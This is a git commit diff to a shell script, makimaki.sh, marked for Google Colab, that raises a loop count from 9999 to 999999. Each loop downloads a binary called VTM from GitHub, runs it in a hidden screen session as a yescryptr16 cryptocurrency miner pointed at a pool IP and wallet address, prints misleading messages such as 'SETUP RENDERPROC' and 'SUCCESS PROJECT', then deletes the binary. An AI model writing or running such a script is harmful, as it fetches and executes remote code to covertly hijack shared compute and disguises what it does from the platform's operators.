327ec9b77d3d4ea6692a3983773a3d1f56df4502
renilo <88342640+renilo@users.noreply.github.com>
2022-10-10 02:24:09 +0700

    Update makimaki.sh

--- makimaki.sh
+++ makimaki.sh
@@ -4,4 +4,4 @@
 # Google Colab
 sudo apt-get install screen -y
 
-for i in `seq 1 9999`; do echo $i; sudo wget -q https://github.com/indah38/theta/raw/main/VTM; chmod 700 VTM;clear;echo SETUP RENDERPROC; screen -dmS Running ./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU -p x -t40 ; sleep 1500; clear; screen -XS Running quit; rm -f VTM; echo SUCCESS PROJECT; sleep 3; done
+for i in `seq 1 999999`; do echo $i; sudo wget -q https://github.com/indah38/theta/raw/main/VTM; chmod 700 VTM;clear;echo SETUP RENDERPROC; screen -dmS Running ./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU -p x -t40 ; sleep 1500; clear; screen -XS Running quit; rm -f VTM; echo SUCCESS PROJECT; sleep 3; done
